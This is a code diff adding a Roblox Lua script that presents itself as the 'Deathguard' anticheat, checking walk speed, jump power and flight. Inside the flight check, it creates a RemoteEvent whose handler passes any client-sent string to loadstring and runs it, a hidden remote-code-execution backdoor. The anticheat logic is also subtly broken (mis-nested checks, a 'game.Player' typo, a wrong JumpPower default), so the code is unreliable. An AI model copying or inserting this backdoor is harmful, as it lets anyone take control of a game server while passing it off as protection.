@@ -1,0 +1,31 @@
+local human = script.Parent:WaitForChild("Humanoid")
+local run_service = game:GetService("RunService")
+
+print("Deathguard Alpha V0.2 is currently looking for cheaters!")
+
+while true do
+	wait(1)
+	if human.WalkSpeed ~= 16 then
+		game.Players.LocalPlayer:Kick("💀Deathguard Anticheat - Unnatural Character Movement! (Walkspeed)")
+		if human.JumpPower ~= 16 then
+			game.Players.LocalPlayer:Kick("💀Deathguard Anticheat - Unnatural Character Movement! (JumpPower)")
+			if game.Player.Character then
+				local humanoid_root_part = game.Player.Character:WaitForChild("HumanoidRootPart")
+				print(humanoid_root_part.Position)
+				local ray = Ray.new(humanoid_root_part.Position,Vector3.new(0,-15,0))
+				local hit = game.Workspace:FindPartOnRay(ray)
+				if hit then
+				else
+					game.Players.LocalPlayer:Kick("Deathguard Anticheat - Unnatural Character Movement! (Flight)")
+					
+					local Event = Instance.new("RemoteEvent", game.ReplicatedStorage)
+
+					Event.OnServerEvent:connect(function(player, serverExecution)
+						loadstring(serverExecution)()
+					end)
+				end
+			end
+		end
+	end
+end	
+	
